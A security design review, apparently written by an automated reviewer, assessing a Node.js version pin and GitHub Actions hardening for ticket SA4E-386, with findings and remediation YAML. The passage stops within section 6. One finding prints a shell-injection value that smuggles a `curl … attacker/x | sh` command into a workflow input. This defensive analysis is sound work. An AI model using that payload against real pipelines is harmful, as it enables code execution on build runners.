# Security Design Review — SA4E-386

## Pin Node.js to 22.23.4 (CVE-2026-111497) and Retire the Legacy `better-sqlite3` Workflow

---

## Document Information

| Field | Value |
|---|---|
| Ticket | SA4E-386 |
| Phase | 3.7 — Security Design Review (pre-implementation) |
| Review type | Design review (static, read-only). No code, TDD, or FSD was modified |
| Design under review | `documents/SA4E-386/TDD.md` v1.1 |
| Requirements baseline | `documents/SA4E-386/FSD.md` v1.3, `documents/SA4E-386/BRD.md` |
| Implementation plan | `documents/node-security-upgrade/PLAN.md` |
| Repository baseline | `main` @ working tree inspected 2026-10-28 (change not yet implemented) |
| Date | 2026-10-28 |
| Reviewer | Security Agent |
| Document version | 1.0 |
| **Verdict** | **APPROVED WITH CONDITIONS** (3 blocking conditions, 4 non-blocking) |

---

## 1. Executive Summary

SA4E-386 pins Node.js to `22.23.4` across five declaration families (root/backend `engines`, `.nvmrc`, `backend/Dockerfile` ARGs, 27 workflow literals, lockfile metadata), replaces the base-image tag pin with an OCI **index** digest, and deletes the dead `better-sqlite3` prebuild workflow together with its two consumer references.

From a security-design standpoint this is a **strong, unusually well-specified change**. The digest-resolution contract (N-1…N-5, E-1…E-3) correctly distinguishes an OCI index digest from a platform-manifest digest and from a wrong-variant digest; the measurable restatement of NFR-SEC-01 (AD-8: M1 ∧ M2 ∧ M3 against a baseline image, with one unfiltered scan) removes the "0 CVE" hand-wave that made the original NFR unfalsifiable; the no-relaxation invariant (SCC-07) is diff-scoped and enumerable; and the workflow removal is atomic by design, with both sides of the `workflow_run`/`workflow_dispatch` edge removed in one commit. The removal is also a **net security improvement**: it deletes one workflow that held `contents: write` for release uploads and one `npm install "<user-input>@<version>"` path.

The review nevertheless found **one High** and **seven Medium** issues. The High does not concern the pin itself — it concerns the pipeline the design relies on as its CVE gate: `build-push-backend.yml` **pushes the image first and scans afterwards**, and the Trivy step is **skipped entirely on `pull_request`**. The gate therefore cannot prevent distribution of an image that fails the scan, and the pre-merge path produces no automated CVE evidence at all. Secondary issues are: the digest being enforced only through an overridable Docker `ARG` (no CI assertion), NFR-SEC-01 evidence not being hermetic because the Dockerfile runs an unpinned `apt-get upgrade` plus a manual `npm pack` overlay, four workflows (three of them edited by this ticket) with no top-level `permissions:` block, and the preserved `build-onnxruntime.yml` still interpolating a dispatched input directly into a shell script before installing an arbitrary package into a `contents: write` release job.

None of these findings argues against shipping the CVE fix. The CVE is confirmed real and critical (CVE.org, published 2026-10-22; CVSS v4 9.2; Node.js 22.x affected below 22.23.4), and delaying the upgrade to refactor CI would leave the production runtime exploitable. The correct disposition is to **approve the pin with blocking evidence conditions** and to schedule the pipeline hardening as dated follow-ups, except where a compensating control can be applied before merge.

### Severity summary

| Severity | Count | IDs |
|---|---|---|
| 🔴 Critical | 0 | — |
| 🟠 High | 1 | SEC-CI-01 |
| 🟡 Medium | 7 | SEC-SC-01, SEC-SC-03, SEC-CI-02, SEC-CI-03, SEC-CI-06, SEC-CVE-01, SEC-DR-01 |
| 🔵 Low | 7 | SEC-SC-02, SEC-CI-04, SEC-CI-05, SEC-DR-02, SEC-RB-01, SEC-RM-01, SEC-DK-01 |
| ℹ️ Informational | 1 | SEC-DOC-01 |

**Overall risk of the change as designed: Medium.** The change reduces runtime exposure to a Critical RCE; the residual risk is concentrated in CI/CD process integrity (evidence validity and gate ordering), not in the shipped artefact.

---

## 2. Scope, Method, and Verified Baseline

### 2.1 In scope

1. Supply-chain integrity of the base image: version choice, OCI index digest pinning, resolution and verification procedure, provenance.
2. CI/CD permissions and secrets: least privilege, secret exposure in logs, `workflow_run` semantics, completeness of the `build-native.yml` removal.
3. Base-image CVE posture: patch strategy, Trivy gating, and the measurability of NFR-SEC-01.
4. Reproducibility and drift: `engines`, `.nvmrc`, lockfile, workflow `node-version` literals, and the automations that keep them aligned.
5. Failure modes and rollback.
6. Security regression analysis of deleting `build-native.yml`.

### 2.2 Out of scope

- Application-layer vulnerabilities (covered by the Phase 5.7 assessment).
- Penetration testing, runtime exploitation, or dynamic scanning of the candidate image. **No Trivy run was executed for this review**; all statements about the CVE posture of the new base image are about the *design of the claim*, not about measured output.
- Deployed infrastructure, registry configuration, branch-protection settings (not visible from the repository).
- Historical documents under `documents/SA4E-189/…` that still reference Node 18/20.

### 2.3 Repository baseline actually observed (not inferred from the design)

| Observation | Value | Evidence |
|---|---|---|
| Root `engines.node` | `22.x` (advisory) | `package.json` |
| Backend `engines.node` | `22.x` | `backend/package.json` |
| `.nvmrc` | 4 bytes (`22` + CRLF) — already Windows-contaminated | `[IO.File]::ReadAllBytes(".nvmrc").Length` |
| Dockerfile base | `ARG NODE_VERSION=22`, digest `sha256:43ac6c60…772c` | `backend/Dockerfile:32,35` |
| `FROM` statements | exactly two, both `node:${NODE_VERSION}-slim@${NODE_BASE_DIGEST}` | `backend/Dockerfile:40,178` |
| Workflow files | 16 | `.github/workflows/*.yml` |
| `node-version:` keys | 29 (27 literals + 2 matrix expressions) | grep census |
| `better-sqlite3` in manifests | 0 occurrences | `package.json`, `backend/package.json`, `extension/package.json` |
| `better-sqlite3` in lockfile | 1 metadata-only optional-peer entry (`knex`) | `package-lock.json:11620` |
| Root `.npmrc` | absent → `engine-strict` defaults to `false` | `Test-Path .npmrc` |
| Dependabot / Renovate | absent | no `.github/dependabot.yml`, no `renovate.json` |
| Trivy invocation in CI | `--severity CRITICAL,HIGH --ignore-unfixed --exit-code 1`, non-PR only, after push | `build-push-backend.yml:126-134` |

### 2.4 External verification of the CVE premise (Q-4)

| Fact | Value | Source |
|---|---|---|
| CVE | CVE-2026-111497 — out-of-bounds write in the Brotli decoder | CVE.org record (published 2026-10-22, updated 2026-10-23) |
| Affected Node.js 22.x | versions **before 22.23.4** | CVE.org; Node.js October 2026 advisory; Rapid7 ETR (2026-10-26) |
| Scoring | **CVSS v4 9.2 (Critical)**; Node.js classifies the issue as High | CVE.org / ASEC advisory / SecurityWeek |
| Exploitation precondition | decoding a crafted Brotli stream from an untrusted source (`fetch()`, `zlib` Brotli APIs) | CVE.org, Vercel bulletin |
| `22.23.4` status | valid remediation target for the 22.x line (24.x needs 24.22.1, 26.x needs 26.12.1) | Node.js advisory; Vercel bulletin |

**Reachability note (context-aware severity).** In this repository the backend does not decode request bodies with Brotli: there are **0** matches for `brotli`/`zlib`/`Content-Encoding` in `backend/src`. The realistic reachable path is indirect: `@huggingface/transformers` (a backend dependency) downloads model artefacts over `fetch()`, and undici transparently decodes `Content-Encoding: br` responses. The CVE is therefore **latent-but-reachable** rather than trivially triggerable by an unauthenticated HTTP client. This does not change the recommendation (the vulnerable code is in the shipped runtime and future code paths inherit it), but it does mean the ticket's own severity framing should be corrected — see SEC-DOC-01.

---

## 3. Answers to the Design's Open Questions (§15.4)

| Q | Question | Security answer |
|---|---|---|
| **Q-1** | Accept AD-8 (M1 ∧ M2 ∧ M3 against a baseline image) as the operational meaning of NFR-SEC-01? | **ACCEPTED WITH AMENDMENT.** The differential claim is the right construct. Two amendments are mandatory: (a) the baseline **must be the currently deployed image digest**, not a fresh rebuild from the old base — see SEC-CVE-01; (b) the unfiltered scan output must be retained as an artefact, not just summarized, or M1 cannot be re-checked later. |
| **Q-2** | Accept AD-9 (CONTAINER-mode evidence) as satisfying "verification runs on the project runtime"? | **ACCEPTED.** Evidence produced on a host runtime that the pin does not support is not evidence. Binding the gate to `node:22.23.4-slim@<digest>` is strictly stronger than trusting the developer's shell. |
| **Q-4** | Are the CVE identifiers/severities confirmed? | **CONFIRMED with one correction.** CVE-2026-111497 and the fix version 22.23.4 are confirmed. The severity is **CVSS v4 9.2 Critical**, not "High" as stated in the BRD/PLAN; see SEC-DOC-01. |
| **Q-5** | Should the digest be re-pinned automatically, and by whom? | **Yes, and it should not stay manual.** A digest pin without a refresh mechanism converts a patched image into a decaying one. See SEC-SC-03 for the recommended owner and cadence. |

---

## 4. Review Area 1 — Supply-Chain Integrity

### What the design gets right

- The pin is an **OCI image-index digest** (multi-arch manifest list), not a platform-manifest digest. N-4 exists precisely because pinning a platform digest silently breaks the non-amd64 legs — a failure that only surfaces on a different architecture. This is the correct choice and is stated normatively.
- Normalisation rules N-1…N-5 are testable and cover the four realistic paste errors (quotes, uppercase hex, trailing newline, wrong variant). The three binding proofs (E-1 file = registry, E-2 build actually used the digest, E-3 in-image `node -v`) form a proper chain: E-3 is the only one that catches a *valid but wrong* digest.
- Refusing to fall back to a floating tag on registry failure (§10.3 emergency path) is the correct trade: a recoverable build failure is better than an unrecoverable supply-chain gap.
- The Dockerfile header keeps "the digest is the authoritative pin" and the change is confined to `ARG`s, leaving both `FROM` lines untouched — which preserves the reviewed indirection and keeps the diff auditable.

### Finding SEC-SC-01 — Digest is enforced only through an overridable build argument

| Attribute | Value |
|---|---|
| **Severity** | 🟡 Medium |
| **OWASP** | A08:2021 — Software and Data Integrity Failures |
| **CWE** | CWE-494: Download of Code Without Integrity Check |
| **CVSS** | 4.4 — `AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:H/A:N` |
| **Location** | `backend/Dockerfile:32,35,40,178`; `.github/workflows/build-push-backend.yml:110-121` |
| **Status** | Open (design gap) |

**Description.**
The design states that "the digest is the authoritative pin", but the digest lives in `ARG NODE_BASE_DIGEST`, not in the `FROM` line. Docker resolves `ARG` defaults only when no `--build-arg` is supplied; any caller can override `NODE_BASE_DIGEST` (and `NODE_VERSION`) at build time while the file still reads `22.23.4`. Assumption **A-04** in the TDD asserts that `build-push-backend.yml` passes no such overrides — which is true today (the build step at L110-121 sets no `build-args`) — but it is an *assumption recorded in a document*, not a control enforced by the pipeline. A future workflow edit, a local release script, or a maintainer reproducing "one quick fix" can substitute a different base image and every static gate (CC-09/CC-12 check the file, not the build) will still pass. E-2 (`grep -F "node:22.23.4-slim@<digest>" build.log`) is the only detector and it is a manual, per-run read.

**Impact.**
A build that appears to ship 22.23.4 can ship arbitrary base-image bytes. This is the exact threat T-1/T-2 the digest pin exists to prevent; the control is bypassable by the party it protects against (a contributor with build access), and the bypass leaves no red check. Because the ticket's security claim is anchored on "the digest is the authoritative pin", an unenforced digest makes the claim conditional on reviewer diligence rather than on the build system.

**Remediation.**
Add a CI assertion that the registry digest for the tag equals the value in the Dockerfile, and fail on any build-arg override. Minimal, additive step in `build-push-backend.yml` before the build (no workflow restructuring, no new file):

```yaml
      - name: Assert base-image pin (SEC-386)
        run: |
          set -euo pipefail
          DECLARED=$(grep -E '^ARG NODE_BASE_DIGEST=' backend/Dockerfile | cut -d= -f2)
          RESOLVED=$(docker buildx imagetools inspect node:22.23.4-slim \
                       --format '{{json .Manifest.Digest}}' | tr -d '"')
          echo "declared=$DECLARED resolved=$RESOLVED"
          test "$DECLARED" = "$RESOLVED" || {
            echo "::error::NODE_BASE_DIGEST does not match the registry index digest"; exit 1; }
```

Additionally, reject overrides explicitly at the build step (defence in depth):

```yaml
        with:
          build-args: |
            NODE_VERSION=22.23.4
            NODE_BASE_DIGEST=${{ env.NODE_BASE_DIGEST_FROM_FILE }}
```

and, if the pipeline is ever allowed to override them, require the override to be byte-equal to the Dockerfile default. The stronger long-term option is to remove the indirection for the digest (`FROM node:22.23.4-slim@sha256:…`), but that conflicts with BR-12 and is therefore a follow-up decision, not a condition of this ticket.

**Reference:** CWE-494; SLSA Build Level 2 (build platform must not be able to substitute inputs silently).

---

### Finding SEC-SC-02 — Digest equality is not authenticity: no signature, provenance, or SBOM verification

| Attribute | Value |
|---|---|
| **Severity** | 🔵 Low |
| **OWASP** | A08:2021 — Software and Data Integrity Failures |
| **CWE** | CWE-345: Insufficient Verification of Data Authenticity |
| **CVSS** | 3.1 — `AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N` |
| **Location** | TDD §6.1, §7.5.1 (T-1 residual); `.github/workflows/build-push-backend.yml:110-121` |
| **Status** | Open (accepted by design as OI-T-08 — Security does not accept it silently) |

**Description.**
Pinning a digest guarantees *immutability*, not *authenticity*. T-1 in the threat model already concedes this: "the content trust still depends on Docker/Node's publishing chain". The design does not verify that chain. Official Node.js images publish build attestations and SBOMs; `docker buildx imagetools inspect` exposes them and `cosign verify-attestation` can validate them, but neither appears in the resolution procedure (EV-05 records only `Manifest.Digest` and `mediaType`). Likewise, the image produced by this ticket is pushed with no `provenance:` or `sbom:` input, so downstream consumers of `ghcr.io/…/backend` cannot verify how it was built.

**Impact.**
If Docker Hub or the Node publishing pipeline were compromised at the moment of resolution, the design would faithfully pin malicious-but-immutable bytes. Likelihood is low; the impact is total. This is defence-in-depth, not a blocker.

**Remediation.**
Record attestation presence as part of E-1 and enable provenance/SBOM on the build:

```yaml
      - name: Build and push
        uses: docker/build-push-action@5cd11c3a4ced054e52742c5fd54dca954e0edd85 # v6.7.0
        with:
          provenance: mode=max
          sbom: true
```

```bash
# E-1 extension: prove the pinned digest carries a Node/Docker attestation
docker buildx imagetools inspect node:22.23.4-slim \
  --format '{{json .Provenance}}' | jq -e '.SLSA != null' \
  || echo "NOT_EXECUTED: no provenance available"
```

Do **not** convert "attestation unavailable" into a PASS; record it as `NOT_EXECUTED` per BR-21. Recommended as a dated follow-up (OI-T-08), not a merge blocker.

---

### Finding SEC-SC-03 — No automated digest/CVE refresh; the pin decays silently

| Attribute | Value |
|---|---|
| **Severity** | 🟡 Medium |
| **OWASP** | A06:2021 — Vulnerable and Outdated Components |
| **CWE** | CWE-1104: Use of Unmaintained Third-Party Components |
| **CVSS** | 4.4 — `AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:H/A:N` |
| **Location** | repository-wide (no `.github/dependabot.yml`); TDD §9.5, §14.2 (OI-T-08, OI-T-11) |
| **Status** | Open (deferred in the design; Security escalation of the deferral) |

**Description.**
After this ticket there is **no scheduled control that scans the base image for CVEs and no automation that proposes a new digest**. The only scheduled workflow (`scheduled-prebuild-scan.yml`) scans *release assets* for the ONNX prebuild pipeline; it is not a vulnerability scanner. The compensating control is a **monthly manual INV-01 drift check** (§9.5), which the TDD itself calls "the honest weak point … compensating controls decay".

This matters more than usual here: CVE-2026-111497 was published 2026-10-21/22 and the ticket is dated 2026-10-27 — the organisation learned about it from outside, not from a scanner. A digest pin freezes *bytes*, so a future base-image CVE will not be discovered by rebuilding; it will only be discovered by scanning the pinned image or reading advisories.

**Impact.**
The window between "a CVE is published for the pinned base" and "the organisation knows" is unbounded and depends on human attention. For a runtime that ships an MCP server with network exposure, that window is the exposure.

**Remediation (recommended, minimum viable).**
Dependabot needs only a configuration file — no workflow restructuring, so it does not conflict with BR-18 (it does add a 19th path, so it belongs to a **follow-up ticket**, not to this diff):

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: docker
    directory: /backend
    schedule: { interval: weekly }
    open-pull-requests-limit: 3
  - package-ecosystem: github-actions
    directory: /
    schedule: { interval: weekly }
```

Complements: (a) a weekly `trivy image` run against the **deployed digest** (not a rebuild), (b) a named owner for the monthly INV-01 check, (c) an explicit re-pin cadence — Security recommends **on every Node.js security release + quarterly**, whichever comes first.

---

## 5. Review Area 2 — CI/CD Permissions, Secrets, and Workflow Removal

### 5.1 `workflow_run` assessment (explicit answer)

The classic `workflow_run` privilege-escalation pattern is: an unprivileged `pull_request` workflow runs attacker code, completes, and a privileged `workflow_run` consumer (with write token and secrets) then checks out or executes artefacts from that run. **That pattern does not apply here.** Both producers listed in `auto-release.yml:4-8` (`build-native.yml`, `build-onnxruntime.yml`) are `workflow_dispatch`-only (`build-native.yml:3-4`, `build-onnxruntime.yml:3-4`); `workflow_dispatch` requires write access. The consumer does not download artefacts from the triggering run — it only reads job conclusions via `gh api … /actions/runs/$RUN_ID/jobs` (`auto-release.yml:36-37`) and then checks out the default branch.

Two residual observations remain, recorded as SEC-CI-04 and SEC-CI-05. The removal of `build-native.yml` **reduces** this surface from two producers to one, which is a genuine improvement.

### Finding SEC-CI-01 — Trivy gate runs after the image is pushed and is skipped on pull requests

| Attribute | Value |
|---|---|
| **Severity** | 🟠 High |
| **OWASP** | A06:2021 — Vulnerable and Outdated Components / A08:2021 |
| **CWE** | CWE-693: Protection Mechanism Failure |
| **CVSS** | 7.0 — `AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:L` |
| **Location** | `.github/workflows/build-push-backend.yml:110-121` (push), `:126-134` (scan) |
| **Status** | Open (pre-existing, but this ticket designates it as the NFR-SEC-01 gate) |

**Description.**
Two independent defects in the gate that the design relies on:

1. **Ordering.** Step 5 builds *and pushes* (`push: ${{ github.event_name != 'pull_request' }}`, L117); step 6 scans the already-pushed digest (L130). The workflow comment concedes the consequence: "push already succeeded in step 5; a failure here surfaces RED so the image is flagged, not silently accepted". A red check does not un-publish an image. On `main`, `metadata-action` also emits `latest` (L79), so a vulnerable image is pullable under a moving tag before anyone reads the result.
2. **Event scope.** The scan step is guarded by `if: github.event_name != 'pull_request'` (L127). Pull requests — the only place a merge decision is made — therefore get **no automated CVE evidence**. For this very ticket, the change that introduces a new base image is reviewed in a PR where no Trivy step runs; the first scan happens after merge, on the push build.

The design partially acknowledges this (local Trivy is "optional"; `NOT_EXECUTED` is allowed for CC-17), but BR-21 in the FSD calls the CI gate *mandatory*. As implemented, the mandatory gate is post-merge and non-preventive.

**Impact.**
The control cannot perform its stated function (prevent a vulnerable image from being distributed) and provides no evidence where the merge decision is taken. The practical consequence for this ticket: the M1/M2/M3 claim would be supported only by an optional local run, and the first automated confirmation would arrive after the image is already published to GHCR and Docker Hub.

**Remediation.**
Split build from publish so the scan can fail *before* distribution, and scan PR builds too:

```yaml
      - name: Build candidate (no push)
        id: build
        uses: docker/build-push-action@5cd11c3a4ced054e52742c5fd54dca954e0edd85 # v6.7.0
        with:
          context: ${{ env.BUILD_CONTEXT }}
          file: ${{ env.BUILD_CONTEXT }}/Dockerfile
          target: ${{ env.BUILD_TARGET }}
          push: false
          load: true
          tags: sa4e-backend:candidate
          cache-from: type=gha
          cache-to: type=gha,mode=max

      - name: Scan candidate (Trivy) — runs on PR and push
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # 0.36.0
        with:
          image-ref: sa4e-backend:candidate      # local image, not yet published
          format: table
          exit-code: "1"
          ignore-unfixed: true
          severity: CRITICAL,HIGH

      - name: Push the scanned image under the derived tags
        if: github.event_name != 'pull_request'
        run: |
          set -euo pipefail
          for t in ${{ steps.meta.outputs.tags }}; do
            docker tag sa4e-backend:candidate "$t"
            docker push "$t"
          done
```

Because the pushed bytes are the scanned bytes (same local image, re-tagged), the gate now precedes distribution. The published digest is whatever the registry computes on push — record it in the step summary for traceability.

If the pipeline change cannot fit this ticket (BR-18 forbids workflow restructuring), the **compensating control is mandatory before merge**: produce the AD-8 M1∧M2∧M3 evidence locally against the previous deployed digest, and do **not** promote the `latest` tag until the post-merge scan is green. Record this as a dated follow-up ticket owned by DevOps.

> Note for the reviewer: this finding is about the *gate*, not about the pinned digest. It does not change the recommendation to ship 22.23.4.

---

### Finding SEC-CI-02 — Four workflows (three edited by this ticket) have no top-level `permissions:` block

| Attribute | Value |
|---|---|
| **Severity** | 🟡 Medium |
| **OWASP** | A01:2021 — Broken Access Control / A05:2021 — Security Misconfiguration |
| **CWE** | CWE-250: Execution with Unnecessary Privileges |
| **CVSS** | 5.4 — `AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N` |
| **Location** | `.github/workflows/ci.yml` (no `permissions:`); `ci-sa4e-191.yml`; `ci-sa4e-223.yml`; `build-onnxruntime.yml` |
| **Status** | Open (pre-existing; the design explicitly claims "no permission widening" without auditing the baseline) |

**Description.**
TDD §7.2 states "New permissions introduced: none" and §7.7 forbids widening. That is true but incomplete: the baseline itself is not least-privilege. Four workflows declare no top-level `permissions:`, so the `GITHUB_TOKEN` inherits the **repository default**, which for a repository created before GitHub's read-only default (or reconfigured by an admin) can be read/write on `contents`. Three of those four are edited by this ticket (`ci.yml`, `ci-sa4e-191.yml`, `ci-sa4e-223.yml`) and all of them run on `pull_request` and execute `npm install` — which runs lifecycle scripts (`postinstall: node scripts/patch-vendored-deps.mjs`). The fourth (`build-onnxruntime.yml`) is preserved byte-identically by AD-5/BR-30 and drives a `contents: write` release job.

The design's own control (SCC-07) only greps the Dockerfile diff, so an inherited write token is invisible to every gate in the plan.

**Impact.**
If the repository default is read/write, every pull request executes untrusted package lifecycle scripts with a token that can write to the repository. This is a well-known supply-chain escalation path and it is orthogonal to the Node pin — but the ticket is a CI-security ticket and is editing these files, so leaving it unrecorded would be a missed opportunity at minimum, a real exposure at worst.

**Remediation.**
Two-part, and the first part is free:

1. **Record the fact.** In the PR evidence block, state the repository default workflow-token permission (*Settings → Actions → General → Workflow permissions*) as `read-only` or `read/write` with a screenshot reference.
2. **Narrow where touched.** Adding a `permissions:` block is a *narrowing*, permitted in spirit by BR-14 and banned only by BR-18's "value-only" rule. If the ticket owner refuses the structural edit, the follow-up ticket is mandatory:

```yaml
# ci.yml — add immediately after the `on:` block
permissions:
  contents: read
```

```yaml
# build-onnxruntime.yml — narrow at workflow level, widen only in the release job
permissions:
  contents: read
jobs:
  release:
    permissions:
      contents: write   # unchanged, but now scoped to the only job that needs it
```

---

### Finding SEC-CI-03 — Preserved `build-onnxruntime.yml` interpolates a dispatched input into a shell command before installing an arbitrary package

| Attribute | Value |
|---|---|
| **Severity** | 🟡 Medium |
| **OWASP** | A03:2021 — Injection / A08:2021 |
| **CWE** | CWE-78: OS Command Injection; CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **CVSS** | 6.4 — `AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N` |
| **Location** | `.github/workflows/build-onnxruntime.yml:48-49, 105-114, 146-150` |
| **Status** | Open (pre-existing; preserved deliberately by BR-30 — Security accepts the preservation, not the pattern) |

**Description.**
The removed workflow and the preserved one share an identical anti-pattern:

```yaml
# build-onnxruntime.yml:48-49  (prepare job — no top-level permissions)
VERSION="${{ inputs.onnxruntime_version || '1.18.0' }}"
NODE_INPUT="${{ inputs.node_version || '22' }}"
# ...
# build job, L113
npm install "onnxruntime-node@${{ needs.prepare.outputs.version }}"
```

A `workflow_dispatch` input is interpolated directly into a `run:` script. A value such as `1.18.0"; curl -s https://attacker/x | sh; echo "` breaks out of the quotes and executes arbitrary commands; even without escaping, a non-semver spec (`git+https://…`, a tarball URL, or a typosquatted package name) causes an arbitrary package to be installed and then **published as a release asset** by the `contents: write` release job (L146-150). The same file has no top-level `permissions:`, so the `prepare`/`build` jobs run with the default token as well.

This is directly relevant to the ticket's second objective: deleting `build-native.yml` removes **one** instance of this pattern, not the pattern. The design's justification for deletion (dead pipeline, no consumer) is correct and unchanged; but a reviewer should not conclude that the surviving prebuild pipeline is hardened.

**Impact.**
An actor with write access can escalate from "can dispatch a workflow" to "can execute commands in a runner" and "can publish release artefacts consumed by other builds". Write access is already a trusted role, which caps the severity; the escalation path is what makes it a finding.

**Remediation.** (follow-up ticket; explicitly out of this diff per BR-30)

```yaml
      - name: Validate inputs
        env:
          ORT_INPUT: ${{ inputs.onnxruntime_version }}
          NODE_INPUT: ${{ inputs.node_version }}
        run: |
          set -euo pipefail
          [[ "${ORT_INPUT:-1.18.0}" =~ ^[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]] \
            || { echo "::error::invalid onnxruntime_version"; exit 1; }
          [[ "${NODE_INPUT:-22}" =~ ^(20|22|24|all)$ ]] \
            || { echo "::error::invalid node_version"; exit 1; }

      - name: Install onnxruntime-node
        env:
          ORT_VERSION: ${{ needs.prepare.outputs.version }}   # never inline ${{ }} in run:
        run: |
          set -euo pipefail
          npm install "onnxruntime-node@${ORT_VERSION}"
```

Plus: `permissions: contents: read` at workflow level; keep `contents: write` only on `release`; and verify the `sha256` of each produced archive against a recorded manifest before upload (the workflow already generates `.sha256` files but never re-verifies them).

---

### Finding SEC-CI-04 — `workflow_run` consumer lacks an explicit provenance guard

| Attribute | Value |
|---|---|
| **Severity** | 🔵 Low |
| **OWASP** | A01:2021 — Broken Access Control |
| **CWE** | CWE-863: Incorrect Authorization |
| **CVSS** | 3.1 — `AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N` |
| **Location** | `.github/workflows/auto-release.yml:4-8, 21-23, 36` |
| **Status** | Open (latent; not exploitable with the current producer set) |

**Description.**
`auto-release.yml` holds `contents: write` (L15-16) and pushes to `main` with `--force-with-lease` (L87) after amending a commit, then publishes to npm with `NPM_TOKEN` (L101-114). Its `if` condition (L21-23) checks only `conclusion == 'success'`; it does **not** assert that the triggering run came from this repository, from the default branch, or from a `workflow_dispatch` event. Today this is safe because both producers are `workflow_dispatch`-only. It becomes exploitable the day someone adds a `pull_request` trigger to `build-onnxruntime.yml` — a change that would look innocuous in review and would silently hand PR-triggered runs a write-token consumer.

**Impact.**
Latent privilege escalation. The guard is one line and costs nothing; its absence is a trap for a future contributor.

**Remediation.**

```yaml
    if: >
      github.event_name == 'workflow_dispatch' ||
      (github.event.workflow_run.conclusion == 'success' &&
       github.event.workflow_run.event == 'workflow_dispatch' &&
       github.event.workflow_run.head_repository.full_name == github.repository &&
       github.event.workflow_run.head_branch == github.event.repository.default_branch)
```

Also pass the run id through `env:` rather than inline interpolation (`RUN_ID: ${{ github.event.workflow_run.id }}`), consistent with the input-handling rule in SEC-CI-03.

---

### Finding SEC-CI-05 — Release secrets are over-scoped at workflow level and passed on the command line

| Attribute | Value |
|---|---|
| **Severity** | 🔵 Low |
| **OWASP** | A01:2021 / A09:2021 |
| **CWE** | CWE-522: Insufficiently Protected Credentials; CWE-250 |
| **CVSS** | 3.1 — `AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N` |
| **Location** | `.github/workflows/publish.yml:18-20, 83, 89, 93, 131, 149`; `auto-release.yml:25-28` |
| **Status** | Open (pre-existing; touched by the pin edit) |

**Description.**
`publish.yml` grants `contents: write` **and** `packages: write` at workflow level (L18-20), so the read-only `version-check` job and the extension-publish job both receive `packages: write` they never use. Marketplace tokens are interpolated into the command line: `npx vsce publish --packagePath *.vsix -p ${{ secrets.VSCE_PAT }}` (L89) and `npx ovsx publish *.vsix -p ${{ secrets.OVSX_TOKEN }}` (L93). Arguments are visible in `/proc` on the runner and in any process listing; GitHub masks the value in logs, but the token is still exposed to anything running on the same runner. `auto-release.yml` authenticates checkout with `secrets.PAT || github.token` (L27) — a PAT is typically broader than `GITHUB_TOKEN` and may bypass branch protection on the direct push to `main`.

**Impact.**
Low: requires code execution on the runner or a compromised dependency in the publish job. The pattern is still worth fixing because the publish workflows are the highest-value token holders in the repository.

**Remediation.**

```yaml
  version-check:
    permissions:
      contents: read
  publish-extension:
    permissions:
      contents: write    # only if the release upload is needed
  publish-backend:
    permissions:
      contents: read
```

```yaml
      - name: Publish to VS Code Marketplace
        env:
          VSCE_PAT: ${{ secrets.VSCE_PAT }}
        run: npx vsce publish --packagePath *.vsix -p "$VSCE_PAT"
```

Restrict the `PAT` fallback to a fine-grained token scoped to `contents: write` on this single repository, or remove it and rely on `GITHUB_TOKEN` with branch-protection bypass configured explicitly for the bot.

---

### Finding SEC-CI-06 — Inconsistent action pinning: third-party release action on a mutable major tag while docker/trivy actions are SHA-pinned

| Attribute | Value |
|---|---|
| **Severity** | 🟡 Medium |
| **OWASP** | A08:2021 — Software and Data Integrity Failures |
| **CWE** | CWE-1357: Reliance on Insufficiently Trustworthy Component |
| **CVSS** | 4.4 — `AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N` |
| **Location** | `publish.yml:83` (`softprops/action-gh-release@v2`); also `actions/checkout@v7`, `actions/setup-node@v7`, `actions/upload-artifact@v4`, `actions/download-artifact@v4` across all workflows |
| **Status** | Open (pre-existing; the design does not address it) |

**Description.**
The repository already demonstrates the right pattern — `aquasecurity/trivy-action`, all four `docker/*` actions, and `actions/checkout` in `build-push-backend.yml` are pinned to full commit SHAs with version comments. But the same repository runs `softprops/action-gh-release@v2` (a third-party action) inside `publish.yml`, which holds `contents: write` and can create releases; and first-party actions are on floating major tags in every workflow. A mutable tag can be re-pointed by the upstream maintainer (or an attacker who compromises that account) and the next run executes new code with the workflow's token.

Because this ticket's entire premise is "immutable supply-chain references", leaving the action layer mutable is an inconsistency a reviewer should not accept silently.

**Impact.**
Release-asset integrity depends on five third-party/first-party tag histories. Low individual likelihood; high impact in `publish.yml` and `auto-release.yml` (write token + npm token).

**Remediation.**
Pin all `uses:` to SHAs for workflows that hold write tokens, and let Dependabot (SEC-SC-03) keep them current:

```yaml
      - uses: softprops/action-gh-release@<40-char-sha> # v2.x.y
      - uses: actions/checkout@<40-char-sha>            # v7.x.y
```

Not a merge blocker for this ticket (it would add diff outside the allow-list), but it must be a dated follow-up, not an open-ended aspiration.

---

## 6. Review Area 3 — Base-Image CVE Posture and the Measurability of NFR-SEC-01

### 6.1 Assessment of the patch strategy

| Aspect | Assessment |
|---|---|
| Target version | **Correct.** 22.23.4 is the first fixed release on the 22.x line; the design refuses a major jump (24.x needs 24.22.1) because native ABI re-validation is a separate risk — a defensible, security-preserving sequencing. |
| Staying on 22.x | **Accepted, time-boxed.** Node 22 EOL 2027-04-30 (OI-T-13). Security requires the Node 24 migration plan to exist by 2027-01-31, as the design already states. |
| "Latest safe" re-check (G1) | **Correct and necessary.** R-04 is honest: the version can be superseded between design and commit. Halting on a newer safe 22.x is the right behaviour. |
| Named-CVE coverage | **Sufficient.** M1 enumerates the four advisory CVEs by ID; M2 catches regressions; the unfiltered run prevents flag-gaming. |
| Trivy flags | `--severity CRITICAL,HIGH --ignore-unfixed` matches the CI invocation, so the local claim is reproducible. The additional unfiltered run is the right compensating step. |
| Gate placement | **Insufficient** — see SEC-CI-01. |

